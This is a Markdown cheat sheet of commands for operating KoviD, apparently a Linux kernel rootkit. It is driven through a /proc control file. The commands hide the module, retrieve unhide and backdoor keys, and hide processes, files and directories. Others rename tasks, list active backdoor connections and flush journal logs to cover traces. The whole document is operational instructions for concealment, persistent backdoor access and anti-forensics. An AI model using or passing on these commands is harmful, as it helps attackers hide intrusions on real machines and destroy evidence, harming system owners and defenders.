# CheatSheet


## proc UI visibility

*Action:* run

*About:* to switch proc UI on/off repeat command

*Commands:*
- `kill -CONT 31337`


## KoviD invisibility

*Action:* run

*Mode:* debug,deploy

*About:* hide module

*Root required:* debug No, deploy Yes

*Commands:*
- `echo hide-lkm >/proc/example`


## KoviD visibility

*Action:* run

*Mode:* debug

*About:* unhide module

*Root required:* No

*Commands:*
- `echo get-unhidekey >/proc/example`
- `key=$(cat /proc/example)`
- `echo unhide-lkm=$key > /proc/example`


## KoviD visibility in DEPLOY mode

*Action:* run

*Mode:* deploy

*About:* unhide module, KEY is build-time generated, check Makefile output

*Root required:* Yes

*Commands:*
- `echo unhide-lkm=<KEY> > /proc/example`


## Unload KoviD

*Action:* run

*Mode:* debug

*About:* unload module

*Root required:* No

*Commands:*
- `sudo rmmod ./kovid.ko`


## Unload KoviD in DEPLOY mode

*Action:* run

*Mode:* deploy

*About:* unload module AFTER `unhide-lkm` command

*Root required:* Yes

*Commands:*
- `sudo rmmod -f ./kovid.ko`


## Get unhide module KEY

*Action:* UI

*Mode:* debug

*About:* get unhide module KEY

*Root required:* No

*Commands:*
- `echo get-unhidekey >/proc/example`
- `cat /proc/example`


## Get back-doors KEY

*Action:* UI

*Mode:* debug

*About:* get back-door KEY

*Root required:* No

*Commands:*
- `echo get-bdkey >/proc/example`
- `cat /proc/example`


## Hide process (PID)

*Action:* UI

*Mode:* debug,deploy

*About:* to hide/unhide tasks, example PID `1234`

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo 1234 >/proc/example`


## Hide a file in current directory

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-file=README.txt >/proc/example`


## Hide a file elsewhere

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-file=/home/user/README.txt >/proc/example`


## Hide all instances of a file

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-file-anywhere=README.txt >/proc/example`


## Hide a directory in current directory

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-directory=dir1 >/proc/example`


## Hide a directory elsewhere

*Action:* UI

*Mode:* debug,deploy

*About:* Unhide a directory

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-directory=/home/some-user/dir1 >/proc/example`


## Unhide a directory

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a directory

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo unhide-directory=dir1 >/proc/example`


## List hidden files

*Action:* UI

*Mode:* debug

*About:* Show hidden filenames in `dmesg`

*Root required:* No

*Commands:*
- `echo list-hidden-files >/proc/example`
- `dmesg`


## Rename a running task

*Action:* UI

*Mode:* debug,deploy

*About:* Rename PID 1234 task to `newtaskname`

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo rename-task=1234,newtaskname >/proc/example`


## List hidden tasks (PIDs)

*Action:* UI

*Mode:* debug

*About:* Show hidden tasks in `dmesg`

*Root required:* No

*Commands:*
- `echo list-hidden-tasks >/proc/example`
- `dmesg`


## List current back-door connections

*Action:* UI

*Mode:* debug

*About:* Show current back-door connections in `dmesg`

*Root required:* No

*Commands:*
- `echo list-backdoor >/proc/example`
- `dmesg`


## Get the base-address of a process PID

*Action:* UI

*Mode:* debug,deploy

*About:* Fetch process base-address of PID 1234

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo base-address=1234 >/proc/example`
- `cat /proc/example`


## Run journal flush

*Action:* UI

*Mode:* debug,deploy

*About:* flush journal logs

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo journal-flush >/proc/example`

